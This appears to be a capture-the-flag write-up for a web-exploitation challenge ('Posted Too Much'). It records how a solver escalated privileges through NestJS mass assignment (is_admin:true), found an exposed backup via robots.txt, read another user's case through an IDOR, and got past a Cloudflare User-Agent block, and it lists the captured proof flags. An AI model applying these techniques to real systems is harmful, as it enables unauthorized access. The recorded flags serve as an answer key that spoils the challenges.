---
day: 13
slug: "posted-too-much"
lane: web-exploitation
modes: [single_solve, time_trial, mastery]
has_solve_py: [single_solve, time_trial, mastery]
tags: []  # TODO: fill in descriptive kebab-case bug-class/technique tags, e.g. [reflected-xss, idor]
---

## single_solve

# single_solve — web-exploitation-day-13-posted-too-much (Posted Too Much)

Target 1: `https://7263e755f2b42a4f3633dc19d8a88db30115f978e33f9cc8.2026.huntress.ctf.games/`
answer_ids: `proof-1`

## Challenge class

Mass assignment / unsafe binding on a NestJS app ("Profile Binder"). Prompt:
"The form only asked for your name. But the API binds whatever you hand it —
so hand it a promotion."

## Recon

- Root page (`root.html`): mentions "server-side authorization" and an
  "Authorization review: Pending" item, links to `/api/clues`.
- `GET /api/clues` (`clues.json`):
  `{"framework":"NestJS","feature_route":"/inspect-12990e","secondary_route":"/audit-b370ea","current_role":"analyst"}`
- `GET /inspect-12990e` -> `405 {"error":"post_required"}`.
- `POST /inspect-12990e` with any body (even `{}`, malformed field types,
  unknown fields) -> always `201 {"ok":true,"profile":{"display_name":"Learner"}}`
  — the response DTO only ever echoes a fixed placeholder, so this endpoint
  gives no direct feedback about which extra properties are bound server-side.
  No validation errors surfaced for unknown/invalid properties either, so
  there is no `ValidationPipe({whitelist:true, forbidNonWhitelisted:true})`
  rejecting extras — i.e. mass assignment is plausible by design.
- `GET /audit-b370ea` (no prior escalation) -> `403 {"error":"administrator_required"}`.
- No cookies/session tokens are issued anywhere (checked all response
  headers); state must be server-side (single shared entity per attempt),
  not per-client.

## Exploit

Tried a small, evidence-led set of privileged-property names on
`POST /inspect-12990e` (`role`, `roles`, `permissions`, `admin`, `isAdmin`
all stayed `403` on the follow-up audit check). The property that flipped
the server's trust decision was:

```
POST /inspect-12990e {"name":"x","is_admin":true}
```

Immediately after, `GET /audit-b370ea` returned:

```json
{"ok":true,"effect":"bound_privileged_property","evidence":"proof_0cd25ee56e7c4a47a0e9c7a5888e9e00"}
```

(saved in `audit_final.txt`). The server has no reset; once the privileged
property is bound it stays bound for the remainder of the attempt, so later
candidate bodies in the sweep (`promote`, `promoted`, `level`, `access`,
`role: {name: admin}`) also showed `200` afterward — those are not
independently confirmed, only `is_admin:true` is the first body that
produced the flip (all prior candidates in the same ordered sweep had just
produced `403`).

## Proof

`proof-1` = `proof_0cd25ee56e7c4a47a0e9c7a5888e9e00`

## Evidence files

- `root.html`, `root_headers.txt`
- `clues.json`, `clues_headers.txt`
- `inspect_post1.json` / `inspect_post2.json` (name-only / name+role:admin bodies, both static)
- `audit_headers.txt` (pre-escalation 403)
- `audit_final.txt` (post-escalation 200 with evidence)
- `solve.py` — reusable solver: hits `/api/clues`, sweeps a small
  candidate list of privileged body properties on `feature_route`, checks
  `secondary_route` after each, returns the first `evidence` proof string.

## time_trial

# time_trial — web-exploitation-day-13-posted-too-much (Posted Too Much)

Target 1: `https://3d99a31eb1f4b8e6c0543256771afef557ade6976d170530.2026.huntress.ctf.games/`
answer_ids: `proof-1`

`start.json`: `run_for_time: false`, `hall_of_fame_eligible: false`, `deadline: null`
— regular scored run, not a timed Hall-of-Fame attempt (per the mode's own
guidance text, these are "regular scored challenges by default" unless
`run_for_time:true` was requested, which it was not here).

Same NestJS "Profile Binder" mass-assignment app as `single_solve`, fresh
variant (different route hashes):

- `GET /api/clues` -> `{"framework":"NestJS","feature_route":"/inspect-3a56a6","secondary_route":"/internal-646825","current_role":"analyst"}`
  (`clues.json`)
- Reused `../single_solve/solve.py` (ported, not executed from the shared
  historical tree — this is this family's own authored solver). It sweeps a
  small set of unvalidated privileged-property names on `feature_route`
  (`is_admin`, `promote`, `promoted`, `level`, `access`, `role`, `admin`,
  `isAdmin`) and checks `secondary_route` after each POST.
  Note: had to add a browser-like `User-Agent` header — Cloudflare returns
  `403`/error code 1010 ("banned based on browser signature") for the
  default `Python-urllib/x.y` UA. Fixed in `solve.py` for both modes.
- First flip to privileged response came from `is_admin:true` again
  (consistent with single_solve). `GET /internal-646825` after that POST:
  `{"ok":true,"effect":"bound_privileged_property","evidence":"proof_7115cc608aee41d8ac649addb2f6a594"}`
  (`internal_final.txt`).

## Proof

`proof-1` = `proof_7115cc608aee41d8ac649addb2f6a594`

## Evidence files

- `clues.json`, `internal_final.txt`

## mastery

# mastery — web-exploitation-day-13-posted-too-much (Posted Too Much)

Three independent targets, three independent bug classes (mastery mixes
earlier curriculum classes, not just the family's own bug). Each classified
on its own evidence, not by array order.

answer_ids: proof-1 -> Target 1, proof-2 -> Target 2, proof-3 -> Target 3
(joined via `questions[].artifact`).

## Target 1 — "Tiny Uptime" — backup exposure

`https://1db75dd6f6caa3e2e41ece3eeec160d73071b6a496dd9531.2026.huntress.ctf.games/`

- Root page HTML comment: `<!-- deployment note: remember to review crawler
  policy before launch -->` (`T1_root.html`).
- `GET /robots.txt` -> `Disallow: /deploy-34924/`.
- `GET /deploy-34924/` -> open directory listing naming
  `site-config-8d2b4f.json.bak` and `release-notes.txt`.
- `GET /deploy-34924/site-config-8d2b4f.json.bak` (`T1_backup.json`):
  `{"environment":"production","support_note":"proof_36045afe88e5487bb50206a86d718770"}`

proof-1 = `proof_36045afe88e5487bb50206a86d718770`

## Target 2 — "Pocket SOC" — IDOR

`https://3b94ec7d2d5eb80c8fdaaedf446700cca5718c9e5da7d0c5.2026.huntress.ctf.games/`

- `GET /api/clues` without a session -> `{"error":"session_required","login":"/"}`.
- `GET /` establishes `case_session` cookie (`T2_cookies.txt`) and the
  dashboard links own cases (7375, 4853, 6494, owner "Avery") plus an
  activity feed link `/api/events`.
- A case page (`/briefs/7375`) shows the inline fetch template:
  `fetch("/api/briefs/7375")`.
- `GET /api/events` (same cookie) discloses a foreign case reference:
  `{"case_id":17224,"owner":"executive","action":"Case reassigned outside
  your workspace","visibility":"reference_only", ...}`.
- Requesting that foreign id through the same per-case API template, with
  the same session cookie: `GET /api/briefs/17224` ->
  `{"id":17224,"owner":"executive","title":"Acquisition review","status":"restricted","note":"proof_4cbd42e3014f4a8293dbed9f8db70e68"}`
  (`T2_idor.json`). No ownership/authorization check on `/api/briefs/<id>`
  beyond having *any* valid session.

proof-2 = `proof_4cbd42e3014f4a8293dbed9f8db70e68`

## Target 3 — "Profile Binder" (NestJS) — mass assignment (this family's own bug)

`https://1440f5dc86bd9f47d898a499bb58371887a92366052a016c.2026.huntress.ctf.games/`

Same class as `single_solve`/`time_trial`: `GET /api/clues` ->
`{"framework":"NestJS","feature_route":"/execute-a44ff9","secondary_route":"/internal-7e2e81","current_role":"analyst"}`.
Ran the family's reusable `solve.py` (ported from `single_solve`, fixed to
send a browser-like User-Agent — Cloudflare 403s the default
`Python-urllib` UA with error 1010). First body that flipped
`secondary_route` from `403 administrator_required` was again
`{"name":"x","is_admin":true}` POSTed to `feature_route`.
`GET /internal-7e2e81` -> `{"ok":true,"effect":"bound_privileged_property","evidence":"proof_28d183507cd643dc96d935378d714c71"}`
(`T3_internal_final.txt`).

proof-3 = `proof_28d183507cd643dc96d935378d714c71`

## Evidence files

- `T1_root.html`, backup JSON saved as `T1_backup.json`
- `T2_root_headers.txt`, `T2_cookies.txt`, `T2_idor.json`
- `T3_internal_final.txt`
- `solve.py` — reused mass-assignment solver (copied/ported from
  `../single_solve/solve.py`, used only for Target 3's own bug class)
